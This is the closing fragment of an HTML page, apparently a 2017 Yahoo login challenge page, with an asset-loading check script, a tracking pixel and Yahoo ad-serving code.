        &lt;img src="/account/js-reporting/?crumb=WB9Bd6ngh2v&amp;message=javascript_not_enabled" height="0" width="0" style="visibility: hidden;"&gt;
    </noscript>
    <script nonce="pSA9mWZphlGO0oVvCgrXgmTl2Kq5RDrtxYV5n7G7YxrGovEs">
        var checkAssets = function(seconds) {
            setTimeout(function() {
                if (!window.mbrJSLoaded) {
                    window.mbrSendError('js_failed_to_load', location.pathname);
                }
                var check = document.getElementById('mbr-css-check'),
                    style = check.currentStyle;
                if (window.getComputedStyle) {
                    style = window.getComputedStyle(check);
                }
                if (style.display !== 'none') {
                    window.mbrSendError('css_failed_to_load', location.pathname);
                }
            }, (seconds * 1000));
        };

        checkAssets(10);
    </script>
    <div id="mbr-css-check"></div>


<!-- fe11.member.ir2.yahoo.com - Sat Jun 24 2017 08:06:03 GMT+0000 (UTC) - (2ms) -->
<script src="https://fc.yahoo.com/sdarla/php/client.php?l=RICH{dest:tgtRICH;asz:flex}&amp;f=360782993&amp;ref=https%3A%2F%2Flogin.yahoo.com%2Faccount%2Fchallenge%2Fpassword"></script><div id="darla_csc_holder" class="darla" style="display: none;"><iframe style="display: none;" id="darla_csc_writer_0" class="darla" src="https://s.yimg.com/rq/darla/3-0-2/html/r-csc.html" frameborder="no" scrolling="no" allowtransparency="true" hidefocus="true" tabindex="-1" marginwidth="0" marginheight="0"></iframe></div></body></html>